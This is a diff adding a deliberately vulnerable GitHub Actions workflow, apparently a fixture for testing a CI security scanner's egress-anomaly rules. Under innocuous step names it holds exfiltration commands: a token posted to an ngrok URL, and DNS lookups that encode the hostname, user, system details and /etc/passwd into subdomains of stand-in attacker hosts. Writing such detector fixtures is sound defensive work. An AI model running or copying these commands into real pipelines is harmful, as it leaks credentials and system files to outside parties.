@@ -1,0 +1,38 @@
+# =============================================================================
+# Scenario 34: Network Egress Anomaly Detection
+# Demonstrates: Curl to IP addresses, suspicious domain access, DNS exfil
+# Triggers: SCA-109, SCA-039, SCA-038
+# INTENTIONALLY VULNERABLE - DO NOT USE IN PRODUCTION
+# =============================================================================
+name: Integration Test Pipeline
+on: [push]
+
+jobs:
+  run-tests:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      # SCA-109: Network egress to raw IP addresses
+      - name: Health check external dependencies
+        run: |
+          curl -s https://192.168.1.100/api/health
+          wget -q http://10.0.0.50/config
+          curl https://172.16.0.1:8443/status
+
+      # SCA-039: Suspicious domain access
+      - name: Send test notifications
+        run: |
+          curl -X POST https://webhook.site/unique-id -d '{"status":"pass"}'
+          curl https://requestbin.com/abc123 -d '{"tests":"complete"}'
+          curl https://abc123.ngrok.io/callback -d '{"token":"$TOKEN"}'
+          curl https://def456.ngrok-free.app/report -d '{"data":"test"}'
+          curl https://test.pipedream.net/webhook -d '{"event":"deploy"}'
+
+      # SCA-038: DNS exfiltration patterns
+      - name: Resolve service endpoints
+        run: |
+          dig $(cat /etc/hostname).exfil.attacker.com
+          nslookup $(whoami).dns.evil.com
+          host $(uname -a | base64).tunnel.example.com
+          curl "https://dns.google/resolve?name=$(cat /etc/passwd | base64 | head -c 63).data.attacker.com"
